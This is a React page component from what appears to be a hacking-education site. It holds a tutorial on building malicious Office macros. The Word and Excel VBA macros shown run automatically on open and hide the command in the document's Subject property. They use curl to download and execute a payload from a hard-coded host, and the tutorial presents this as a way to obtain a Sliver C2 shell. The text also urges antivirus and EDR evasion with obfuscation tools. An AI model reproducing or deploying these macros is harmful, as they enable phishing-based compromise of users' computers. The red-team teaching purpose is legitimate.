import React, { useState } from 'react';
import { Book, ChevronRight, ArrowLeft } from 'lucide-react';
import { Link } from 'react-router-dom';

// Terminal-style code block component
const TerminalBlock = ({ children }) => (
  <div className="bg-black text-green-400 p-4 rounded border border-green-500 font-mono whitespace-pre-wrap my-4">
    {children}
  </div>
);

// Image component for consistent styling
const ImageBlock = ({ src, alt }) => (
  <img src={src} alt={alt} style={{ maxWidth: "100%", height: "auto" }} className="my-4" />
);

function VbaScripting() {
  const [activeSection, setActiveSection] = useState("vba-scripting-overview");
  const [activeSubSection, setActiveSubSection] = useState("");

  const sections = [
    {
      id: "vba-scripting-overview",
      title: "VBA Scripting Overview",
      content: {
        introduction:
          "Office Visual Basic for Applications (VBA) is a programming language that automates tasks or operations in the files you create with Office Applications.",
        sections: [
          {
            title: "What is VBA Scripting?",
            content: [
              "Visual Basic for Applications (VBA) is a programming language that enables the automation of tasks within Microsoft Office applications. For example, you can write VBA code to prompt users to save a document to a specific network drive upon their initial save attempt. Microsoft offers extensive resources to assist in developing VBA scripts, including the [Office VBA Reference](https://learn.microsoft.com/en-us/office/vba/api/overview/). ",
              "For the purpose of this proof of concept, we will be creating a malicious Word document and utilizing an application object to call another object that is located in the document property.",
              <ImageBlock
                key="img1"
                src="https://manage.offsec.com/app/uploads/2022/06/image13.png"
                alt="VBA Scripting Example"
              />,
              "Once the macro is complete we want to save the document as Word 97-2003 Document (.doc). This technique will also work if we want to save it as a Microsoft Word Macro-Enabled Document (.docm). ",
              <TerminalBlock key="code1">
{`If Application.Documents.Count >= 1 Then 
  MsgBox ActiveDocument.Name 
Else 
  MsgBox "No documents are open" 
End If`}
              </TerminalBlock>,
              "In this example above the VBA code checks to see if the office document has been given a name. If the document does have a name, a message box will appear showing the name of the document. If the document did not have a name, another message box would appear stating “No documents are open”.",
              <ImageBlock
                key="img2"
                src="https://manage.offsec.com/app/uploads/2022/06/image5-1.png"
                alt="VBA Scripting Example"
              />,
              <ImageBlock
                key="img3"
                src="https://manage.offsec.com/app/uploads/2022/06/image4-1.png"
                alt="VBA Scripting Example"
              />,
              "In the previous VBA example, we demonstrated how to retrieve the document's filename and display it in a message box. To ensure this value remains inconspicuous to the target, further research has revealed an alternative approach: utilizing a different object to access specific values within the document's properties.  ",
              "The `Document.BuiltInDocumentProperties` function retrieves a specific built-in document property. However, if a property lacks a defined value, attempting to access it will result in an error. For example, creating a VBA script to extract a specified property value requires handling potential errors when the property is undefined..",
              "Let’s take a look at the following example:",
              <TerminalBlock key="code2">
{`Sub AutoOpen()
  notetaking
End Sub

Sub notetaking()
  'get value from company string in document metadata and run i
  MsgBox ActiveDocument.BuiltInDocumentProperties('Subject').Value
End Sub`}
              </TerminalBlock>,
              <ImageBlock
                key="img4"
                src="https://manage.offsec.com/app/uploads/2022/06/image6-1.png"
                alt="VBA Scripting Example"
              />,
              "This script presents a message box displaying the content of the document's 'Subject' property. To ensure the script functions correctly, input must be provided in the document's 'Subject' field. To do this, right-click the macro-enabled document, select 'Properties,' navigate to the 'Details' tab, and enter your desired input in the 'Subject' field. ",
              <ImageBlock
                key="img5"
                src="https://manage.offsec.com/app/uploads/2022/06/image6-1.png"
                alt="VBA Scripting Example"
              />,
              "Now that we have provided some input into the value category, we will open our document and execute the macro.",
              <ImageBlock
                key="img6"
                src="https://manage.offsec.com/app/uploads/2022/06/image8-2.png"
                alt="VBA Scripting Example"
              />,
              "As demonstrated, the macro successfully displayed a message box containing the value we assigned to the 'Subject' property. This confirms that our macro can retrieve and utilize data from the document's built-in properties. Building upon this, we can adapt the macro to execute an application specified within a document property. For instance, by storing the desired application's path in a custom property, the macro can read this path and launch the application accordingly. This technique leverages the integration of document properties and VBA macros to dynamically control application execution. "
            ]
          },
          {
            title: "Testing Execution in the Subject Category",
            content: [
              "Now that we have a baseline as to how we can load input from the document properties, let’s work on getting an application to execute from our macro. We can use the “shell” function in VBA to have the script run an executable that we call.",
              <TerminalBlock key="code3">
{`Sub AutoOpen()
    calculations
End Sub

Sub calculations()
    'obtain the value from the subject string in document metadata and run it
    Dim strProgramName As String
    Set doc = ActiveDocument 
    strProgramName = doc.BuiltInDocumentProperties('Subject').Value        
    Call Shell("""" & strProgramName & """", vbNormalFocus)
End Sub`}
              </TerminalBlock>,
              <ImageBlock
                key="img7"
                src="https://manage.offsec.com/app/uploads/2022/06/image7-1.png"
                alt="VBA Scripting Example"
              />,
              "The strProgramName will contain the string of the application we want our macro to execute. In this case, we are going to see if the calculator (calc.exe) will appear. ",
              <ImageBlock
                key="img8"
                src="https://manage.offsec.com/app/uploads/2022/06/image11.png"
                alt="VBA Scripting Example"
              />,
              "Now the string has been set with 'calc.exe' in our 'Subject' line, let’s execute our word doc and see what happens! Once we select 'Enable Content', our calculator application appears as expected.",
              <ImageBlock
                key="img9"
                src="https://manage.offsec.com/app/uploads/2022/06/image11.png"
                alt="VBA Scripting Example"
              />
            ]
          },
          {
            title: "Combining Our Scripts to Get a Shell",
            content: [
              "After modifying our macro to launch `calc.exe`, we can enhance its functionality to download a payload that initiates a callback to our system. While tools like Metasploit can generate such payloads, they are frequently detected by antivirus software. To circumvent this, we can employ techniques such as obfuscation and manipulation of the macro code. Tools like Evil Clippy and macro_pack  can assist in evading antivirus detection by altering the macro's structure and content. Additionally, understanding how antivirus engines scan macros, as discussed by Microsoft, can inform strategies to bypass these detections. ",
              "In this context, we'll utilize Sliver, an open-source, cross-platform adversary emulation and red team framework developed by Bishop Fox. Sliver is written in Go, enabling it to operate seamlessly across macOS, Windows, and Linux systems. We'll leverage Sliver's implant capabilities to deploy payloads that establish command and control (C2) channels over protocols such as Mutual TLS (mTLS), WireGuard, HTTP(S), and DNS. This approach provides a versatile and secure method for managing implants across diverse operating environments.",
              "When creating payloads, it's essential to implement strategies that minimize detection by antivirus (AV) software. Various online resources offer techniques to reduce the detectability of your payloads. While the specific methods used here are currently active in operations and won't be disclosed, we encourage you to conduct your own research to enhance your payloads' resilience against AV detection.",
              "For instance, the Veil-Framework is a collection of red team security tools that implement various attack methods focused on antivirus evasion.",
              "Additionally, understanding how antivirus and Endpoint Detection and Response (EDR) systems operate can inform your approach to evasion. These systems often use signature databases, static analysis, heuristic and behavioral detection, and Import Address Table (IAT) inspection to identify malicious activity. By studying these mechanisms, you can develop more effective evasion strategies.",

               "Remember, the landscape of AV detection is continually evolving. Regularly updating your knowledge and tools is crucial to maintaining the effectiveness of your payloads. ",
              "After generating the payload, host it on a web server to facilitate its download and execution by the macro on the target system. Once the payload runs, it establishes a new session that can be managed through Sliver. ",
              "Let’s take a look at the code for this malicious macro: ",
              <TerminalBlock key="code4">
{`Sub AutoOpen()
    chapel
End Sub
Sub chapel()
    Dim strProgramName As String
    Dim strArgument As String
    Set doc = ActiveDocument
    strProgramName = doc.BuiltInDocumentProperties('Subject').Value
    strArgument = "/c curl -s http://192.168.163.130:8443/met.exe --output %temp%\\met.exe && %temp%\\met.exe"
    Call Shell("""" & strProgramName & """ """ & strArgument & """", vbHideFocus)
End Sub`}
              </TerminalBlock>,
              <ImageBlock
                key="img10"
                src="https://manage.offsec.com/app/uploads/2022/06/image12.png"
                alt="VBA Scripting Example"
              />,
              "In this VBScript, we've introduced a strArgument function designed to execute a specified string alongside our target application, which is defined within the 'Subject' property. The script utilizes curl to download a payload, saving it to the user's local temporary directory. After the download completes, the payload is executed, establishing a callback to our system. The 'Subject' property contains cmd.exe, employing the /c switch to execute the command and subsequently terminate the command prompt upon completion.",
              "After crafting our harmful macro, the next step is to save and exit the document. We'll place cmd.exe into the 'Subject' field within the document's built-in properties to incorporate our changes. Once these modifications are applied, reopening the document will allow us to verify if a session has been established."
            ]
          },
          {
            title: "Obtaining a Shell with Microsoft Excel",
            content: [
              "After successfully implementing our malicious macro in Microsoft Word, we can extend this approach to Microsoft Excel by embedding the macro within a Macro-Enabled Worksheet. To adapt the macro for Excel, we need to modify certain functions. Specifically, instead of using Document.BuiltInDocumentProperties, we'll utilize Workbook.BuiltinDocumentProperties to assign our desired value to the workbook's built-in properties. ",
              "Let’s take a look at the code for this malicious macro:",
              <TerminalBlock key="code5">
{`Sub Auto_Open()
    kincaid
End Sub

Sub kincaid()
    
    Dim strProgramName As String
    Dim strArgument As String
    
    Set doc = ActiveWorkbook
    
    strProgramName = doc.BuiltinDocumentProperties('Subject').Value
    
    strArgument = "/c curl -s http://192.168.163.130:8443/met.exe --output %temp%\\met.exe && %temp%\\met.exe"
    
    Call Shell("""" & strProgramName & """ """ & strArgument & """", vbHideFocus)

End Sub
Sub Workbook_Open()
    Auto_Open
End Sub`}
              </TerminalBlock>,
              <ImageBlock
                key="img11"
                src="https://manage.offsec.com/app/uploads/2022/06/image10.png"
                alt="VBA Scripting Example"
              />,
              "In the script, we've modified the function from ActiveDocument to ActiveWorkbook and introduced an additional section. Now, when the workbook enables macros, it will automatically execute them, replicating the behavior we achieved with the malicious Word document. "
            ]
          },
          {
            title: "Conclusion",
            content: [
              "As penetration testers, we frequently focus on Office applications due to their pervasive use in enterprise environments. Visual Basic for Applications (VBA) allows documents to include macros that automate tasks on the host system. While essential for business operations, these macros have a history of being exploited maliciously—a trend that persists today. Attackers continue to leverage these techniques to inflict harm, underscoring the need for security researchers to remain vigilant.",
              "As defenders enhance their capabilities, traditional methods of exploiting Office files are becoming less effective. However, these challenges are not new, and they present numerous research opportunities. For instance, recent vulnerabilities like CVE-2024-38200 demonstrate that longstanding features within Office files can still be exploited. Ongoing exploration of these avenues is crucial for security professionals seeking innovative ways to deliver payloads via Office documents. "
            ]
          }
        ]
      }
    }
  ];

  const activeContent = sections.find((section) => section.id === activeSection)?.content;
  const activeSubSectionContent = activeContent?.sections?.find(
    (s) => s.title === activeSubSection
  );

  return (
    <div className="min-h-screen bg-background text-white">
      {/* Navigation */}
      <nav className="bg-primary-dark border-b border-primary-blue/20">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between h-16 items-center">
            <div className="flex items-center space-x-4">
              <Link
                to="/learning-paths"
                className="text-primary-blue hover:text-primary-blue/80 flex items-center"
              >
                <ArrowLeft className="w-5 h-5 mr-2" />
                Back to Learning Paths
              </Link>
              <span className="text-xl font-bold">
                <span className="text-white">Hack</span>
                <span className="text-primary-red">The</span>
                <span className="text-white">Hackers</span>
              </span>
            </div>
          </div>
        </div>
      </nav>

      {/* Course Header */}
      <div className="bg-primary-dark/50 py-8">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center space-x-4">
            <Book className="w-8 h-8 text-primary-blue" />
            <div>
              <h1 className="text-2xl font-bold">VBA Scripting</h1>
              <p className="text-gray-400 text-sm mt-1">
                Master VBA Scripting Technics
              </p>
            </div>
          </div>
        </div>
      </div>

      {/* Course Content */}
      <div className="flex">
        {/* Left Sidebar */}
        <div className="w-64 bg-primary-dark/30 min-h-[calc(100vh-11rem)] border-r border-primary-blue/20">
          <div className="p-4">
            <h2 className="text-lg font-semibold mb-4">Course Sections</h2>
            <div className="space-y-2">
              {sections.map((section) => (
                <button
                  key={section.id}
                  onClick={() => {
                    setActiveSection(section.id);
                    setActiveSubSection("");
                  }}
                  className={`w-full text-left px-4 py-2 rounded-md flex items-center justify-between ${
                    activeSection === section.id
                      ? 'bg-primary-blue/20 text-primary-blue'
                      : 'hover:bg-primary-blue/10'
                  }`}
                >
                  {section.title}
                  <ChevronRight
                    className={`w-4 h-4 transform transition-transform ${
                      activeSection === section.id ? 'rotate-90' : ''
                    }`}
                  />
                </button>
              ))}
            </div>
          </div>
        </div>

        {/* Main Content */}
        <div className="flex-1 p-8">
          {activeContent && (
            <div className="space-y-8">
              {!activeSubSection && (
                <>
                  <h1 className="text-3xl font-bold text-primary-blue mb-4">
                    {sections.find((s) => s.id === activeSection)?.title}
                  </h1>
                  <p className="text-lg mb-8">{activeContent.introduction}</p>
                </>
              )}

              {activeSubSection && activeSubSectionContent && (
                <div className="space-y-6">
                  <h2 className="text-2xl font-bold text-primary-blue">
                    {activeSubSectionContent.title}
                  </h2>
                  {activeSubSectionContent.content && (
                    <ul className="list-disc list-inside space-y-2 text-gray-200">
                      {activeSubSectionContent.content.map((item, i) =>
                        typeof item === "string" ? (
                          <li key={i}>{item}</li>
                        ) : (
                          <div key={i}>{item}</div>
                        )
                      )}
                    </ul>
                  )}
                </div>
              )}
            </div>
          )}
        </div>

        {/* Right Sidebar */}
        {activeContent?.sections && activeContent.sections.length > 0 && (
          <div className="w-64 bg-primary-dark/30 min-h-[calc(100vh-11rem)] border-l border-primary-blue/20">
            <div className="p-4">
              <h2 className="text-lg font-semibold mb-4">Module Sections</h2>
              <div className="space-y-2">
                {activeContent.sections.map((section, index) => (
                  <button
                    key={index}
                    onClick={() => setActiveSubSection(section.title)}
                    className={`w-full text-left px-4 py-2 rounded-md ${
                      activeSubSection === section.title
                        ? 'bg-primary-blue/20 text-primary-blue'
                        : 'hover:bg-primary-blue/10'
                    }`}
                  >
                    {section.title}
                  </button>
                ))}
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

export default VbaScripting;
